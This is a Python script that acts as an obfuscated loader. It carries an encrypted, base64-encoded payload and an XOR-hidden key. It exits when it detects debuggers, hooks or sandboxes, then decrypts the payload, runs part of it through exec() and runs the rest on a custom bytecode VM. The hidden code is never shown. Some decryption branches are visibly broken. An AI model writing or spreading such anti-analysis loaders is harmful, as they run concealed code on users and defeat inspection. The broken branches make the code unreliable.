#!/usr/bin/env python3
def _rmm(_le):
    return _le % 8526 + 1

import hashlib as _ktzyvzu, hmac as _zzaym, base64 as _wyjew, sys as _ed, zlib as _skalbiq
_le = 205254
_vk = """vYlpIwytJ7da4s4H2R0Tqe/7e0iFvaxZGQAnv2aM8YLlv/YO7EaGUDqW+xVK82NOVT0x/Ve7IhLpo9M+IBm4qpkBuIISfvCBbT8IMDZxDPJrbO8fr4QuWyRmqKODCGaob/MaTDVIUn3PTpLFSsYzaTe7qyBSZglpLoQsN0knKkQMrYUWM0zZPv96knrsdf74pKnRL/5IBGsCS+WOZiQUt0OjHJWGN4j+sDwhkrSujINe+pT+lQcDcyDMD7aNxqs0v4tTKz+3vo6urg1IjeWJKl8MNVFAcISAdLLcfl1O0rI="""
_thcpabo = 3
_yfdzkd = _rmm(_le)

def _vm_run(_code, _consts, _names, _globals, _locals):
    _r = [None] * 64
    _ip = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    while _ip < _n:
        _op = _code[_ip]
        _rd = _code[_ip + 1]
        _rs1 = _code[_ip + 2]
        _rs2 = _code[_ip + 3]
        _imm = _code[_ip + 4] | (_code[_ip + 5] << 8) | (_code[_ip + 6] << 16) | (_code[_ip + 7] << 24)
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 32:
            if not _r[_rd]:
                _ip = _imm * 8
            else:
                _ip += 8
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            import sys as _s
            _s.stderr.write(f"[vm] CALL rd={_rd} rs1={_rs1} argc={_imm} fn_type={type(_fn).__name__} fn={_fn!r} args={_args!r}\n")
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*_r[_rs1:_rs1 + (_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1:_rs1 + _rs2])
        elif _op == 44:
            _r[_rd] = list(_r[_rs1:_rs1 + _rs2])
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm * 8
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            if _imm == 0:
                if not (_v + 1 == _v): pass
            elif _imm == 1:
                if not (_v != _v): pass
            else:
                if not (_v - 1 == _v): pass
        elif _op == 53:
            _v = _r[_rs1]
            if _imm == 0:
                if _v * 0 != 0: pass
            elif _imm == 1:
                if _v != _v: pass
            else:
                if _v + 1 == _v: pass
        _ip += 8

def _vm_deserialize(_data):
    _pos = 0
    _hl = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _hot = _data[_pos:_pos+_hl].decode('utf-8'); _pos += _hl
    _cc = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _data[_pos]; _pos += 1
        _sl = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
        _s = _data[_pos:_pos+_sl]; _pos += _sl
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 6: _v = eval(_s)
        elif _t == 7: _v = _s
        elif _t == 8: _v = eval(_s)
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_data[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_data[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    _ic = int.from_bytes(_data[_pos:_pos+4], 'little'); _pos += 4
    _code = _data[_pos:_pos+_ic*8]
    return _hot, _code, _consts, _names

def _enj():
    if _ed.gettrace() is not None:
        _ed.stderr.write('error: debugger detected\n'); _ed.exit(1)
    _bduxbf = bytes.fromhex("a2a2bc92a9bb9a869fb5e28896b88ba1849288e196bd9d90a3a484869784a8949e8293a49783a3e69c80bf8b94e9bd8583969f969987e08596e2a481e3b998a5bd81a6a283e59493b6b3e1a59be3ab8297b092a083e983968088a7baa597a59795979fe99eb683a0978ba2bda8ba9398a7b7e9a59d94a3e0bfb69fa8a299a8bcbca9818487a09a9894e595908290b4b5968b9ca487e7a88386889993e690b49ae3a39b90e9e694a3a3b79ce6a4bda5e7a29e9990bde5a8bb87e5b681a58295999994a2a5abb4e3a59495b6e1bee693e39e9b9892a2e8b294bf93939395a79e8187908097a281bb859a8097a4b2bfbd95b294e8a697e3a4bca284b0b2bee4e298")
    _bduxbf = bytes(_ ^ 209 for _ in _bduxbf).decode()
    _ed.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _ed.modules:
            _ed.stderr.write('error: debugger detected\n'); _ed.exit(1)
    _xnkc = _wyjew.b64decode(_vk)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_ed.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _ed.stderr.write('error: hook detected\n'); _ed.exit(1)
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher as _slq, algorithms as _upirsg, modes as _wnt
    except ImportError:
        _ed.stderr.write("error: cryptography not installed\n"); _ed.exit(1)

    if len(_ed.meta_path) > 5:
        _ed.stderr.write('error: import hook detected\n'); _ed.exit(1)
    if getattr(_ed, 'flags', None) and _ed.flags.no_user_site:
        _ed.stderr.write('error: sandbox detected\n'); _ed.exit(1)
    if _thcpabo == 0:
        _qtgvo = _xnkc[:16]; _cgoek = _xnkc[-32:]; _ykzd = _xnkc[16:-32]
        _aju = _ktzyvzu.pbkdf2_hmac('sha256', _bduxbf.encode(), _qtgvo, 100000, dklen=64)
        _nttz = _aju[:32]; _tdhby = _aju[32:64]
        _vyhvdhx = _zzaym.new(_tdhby, _ykzd, _ktzyvzu.sha256).digest()
        if not _zzaym.compare_digest(_cgoek, _vyhvdhx):
            _ed.stderr.write("error: integrity check failed\n"); _ed.exit(1)
        _xdwq = _slq(_upirsg.AES(_nttz), _wnt.ECB())
        _fkkvff = _xdwq.decryptor().update(_ykzd) + _xdwq.finalize()
        _fkkvff = _fkkvff[-1]
        if _fkkvff < 1 or _fkkvff > 16 or not all(_ == _fkkvff for _ in _fkkvff[-_fkkvff:]):
            _ed.stderr.write("error: decryption failed\n"); _ed.exit(1)
        _fkkvff = _fkkvff[:-_fkkvff]
    elif _thcpabo == 7:
        _fkkvff = _wyjew.b32decode(_xnkc)
    elif _thcpabo == 6:
        _fkkvff = _wyjew.b64decode(_xnkc)
    elif _thcpabo == 2:
        _qtgvo = _xnkc[:16]; _cgoek = _xnkc[-32:]; _ykzd = _xnkc[16:-32]
        _aju = _ktzyvzu.pbkdf2_hmac('sha256', _bduxbf.encode(), _qtgvo, 100000, dklen=80)
        _nttz = _aju[:32]; _cem = _aju[32:48]; _tdhby = _aju[48:80]
        _vyhvdhx = _zzaym.new(_tdhby, _ykzd, _ktzyvzu.sha256).digest()
        if not _zzaym.compare_digest(_cgoek, _vyhvdhx):
            _ed.stderr.write("error: integrity check failed\n"); _ed.exit(1)
        _xdwq = _slq(_upirsg.AES(_nttz), _wnt.CTR(_cem))
        _fkkvff = _xdwq.decryptor().update(_ykzd)
    elif _thcpabo == 9:
        def _hrlfct(_iksmo):
            if _iksmo[:2] == b'<~': _iksmo = _iksmo[2:]
            if _iksmo[-2:] == b'~>': _iksmo = _iksmo[:-2]
            _yc = bytearray(); _daxhhnp = 0
            while _daxhhnp < len(_iksmo):
                if _iksmo[_daxhhnp] == 122:
                    _yc.extend(b'\x00\x00\x00\x00'); _daxhhnp += 1; continue
                _rfr = 0; _jos = 0
                while _daxhhnp < len(_iksmo) and _jos < 5:
                    _rfr = _rfr * 85 + (_iksmo[_daxhhnp] - 33); _daxhhnp += 1; _jos += 1
                _gfwkats = _jos - 1
                if _gfwkats > 0: _yc.extend(_rfr.to_bytes(4, 'big')[4-_gfwkats:])
            return bytes(_yc)
        _fkkvff = _hrlfct(_xnkc)
    elif _thcpabo == 8:
        _ky = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _hdaj = {c:i for i,c in enumerate(_ky)}
        def _zf(_ihio):
            _abuy = bytearray(); _lgpd = 0
            while _lgpd < len(_ihio):
                _xceqmo = 0; _cvuefog = 0
                while _lgpd < len(_ihio) and _cvuefog < 5:
                    _xceqmo = _xceqmo * 85 + _hdaj[chr(_ihio[_lgpd])]; _lgpd += 1; _cvuefog += 1
                _eotmex = _cvuefog - 1
                if _eotmex > 0: _abuy.extend(_xceqmo.to_bytes(4, 'big')[4-_eotmex:])
            return bytes(_abuy)
        _fkkvff = _zf(_xnkc)
    elif _thcpabo == 4:
        _qtgvo = _xnkc[:16]; _cgoek = _xnkc[-32:]; _ykzd = _xnkc[16:-32]
        _aju = _ktzyvzu.pbkdf2_hmac('sha256', _bduxbf.encode(), _qtgvo, 100000, dklen=80)
        _nttz = _aju[:32]; _cem = _aju[32:48]; _tdhby = _aju[48:80]
        _vyhvdhx = _zzaym.new(_tdhby, _ykzd, _ktzyvzu.sha256).digest()
        if not _zzaym.compare_digest(_cgoek, _vyhvdhx):
            _ed.stderr.write("error: integrity check failed\n"); _ed.exit(1)
        _xdwq = _slq(_upirsg.ChaCha20(_nttz, _cem), mode=None)
        _fkkvff = _xdwq.decryptor().update(_ykzd)
    elif _thcpabo == 1:
        _qtgvo = _xnkc[:16]; _cgoek = _xnkc[-32:]; _ykzd = _xnkc[16:-32]
        _aju = _ktzyvzu.pbkdf2_hmac('sha256', _bduxbf.encode(), _qtgvo, 100000, dklen=80)
        _nttz = _aju[:32]; _cem = _aju[32:48]; _tdhby = _aju[48:80]
        _vyhvdhx = _zzaym.new(_tdhby, _ykzd, _ktzyvzu.sha256).digest()
        if not _zzaym.compare_digest(_cgoek, _vyhvdhx):
            _ed.stderr.write("error: integrity check failed\n"); _ed.exit(1)
        _xdwq = _slq(_upirsg.AES(_nttz), _wnt.CBC(_cem))
        _fkkvff = _xdwq.decryptor().update(_ykzd) + _xdwq.finalize()
        _fkkvff = _fkkvff[-1]
        if _fkkvff < 1 or _fkkvff > 16 or not all(_ == _fkkvff for _ in _fkkvff[-_fkkvff:]):
            _ed.stderr.write("error: decryption failed\n"); _ed.exit(1)
        _fkkvff = _fkkvff[:-_fkkvff]
    elif _thcpabo == 5:
        _qtgvo = _xnkc[:16]; _cgoek = _xnkc[-32:]; _ykzd = _xnkc[16:-32]
        _aju = _ktzyvzu.pbkdf2_hmac('sha256', _bduxbf.encode(), _qtgvo, 100000, dklen=64)
        _nttz = _aju[:32]; _tdhby = _aju[32:64]
        _vyhvdhx = _zzaym.new(_tdhby, _ykzd, _ktzyvzu.sha256).digest()
        if not _zzaym.compare_digest(_cgoek, _vyhvdhx):
            _ed.stderr.write("error: integrity check failed\n"); _ed.exit(1)
        _fkkvff = bytes(_ykzd[i] ^ _nttz[i % 32] for i in range(len(_ykzd)))
    elif _thcpabo == 10:
        _fkkvff = bytes.fromhex(_xnkc.decode('ascii'))
    elif _thcpabo == 3:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _gzse
        _qtgvo = _xnkc[:16]; _cgoek = _xnkc[-32:]; _fkkvff = _xnkc[16:-32]
        _ykzd = _fkkvff[:-16]; _ckapzw = _fkkvff[-16:]
        _aju = _ktzyvzu.pbkdf2_hmac('sha256', _bduxbf.encode(), _qtgvo, 100000, dklen=76)
        _nttz = _aju[:32]; _cem = _aju[32:44]; _tdhby = _aju[44:76]
        _vyhvdhx = _zzaym.new(_tdhby, _fkkvff, _ktzyvzu.sha256).digest()
        if not _zzaym.compare_digest(_cgoek, _vyhvdhx):
            _ed.stderr.write("error: integrity check failed\n"); _ed.exit(1)
        _fkkvff = _gzse(_nttz).decrypt(_cem, _ykzd + _ckapzw, None)
    else:
        _ed.stderr.write("error: unsupported algorithm\n"); _ed.exit(1)
    _fkkvff, _c, _k, _m = _vm_deserialize(_fkkvff[4:])
    exec(compile(_fkkvff, '<vm>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals())
if __name__ == '__main__':
    _enj()
